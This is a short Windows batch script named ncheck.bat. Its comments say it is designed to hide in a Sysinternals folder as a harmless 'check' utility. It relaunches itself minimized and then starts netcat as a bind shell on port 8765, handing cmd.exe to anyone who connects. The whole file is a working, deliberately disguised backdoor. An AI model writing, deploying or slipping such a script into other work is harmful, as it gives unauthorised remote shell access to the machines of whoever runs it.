@echo off
REM  ncheck.bat - Sits inside a Sysinternals folder to appear as a benign "check" utility.
REM  Requires nc.exe (netcat) in the same directory as this batch file.

REM Minimize the window when double-clicked so the shell runs in the background.
REM IS_MINIMIZED prevents infinite re-launch: only the first run starts minimized.
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit

REM Bind shell: listen on port 8765 and exec cmd.exe for the connecting client.
REM %~dp0 = directory of this batch file (e.g. C:\tools\SysinternalsSuite\)
"%~dp0nc.exe" -l -p 8765 -e cmd.exe
exit
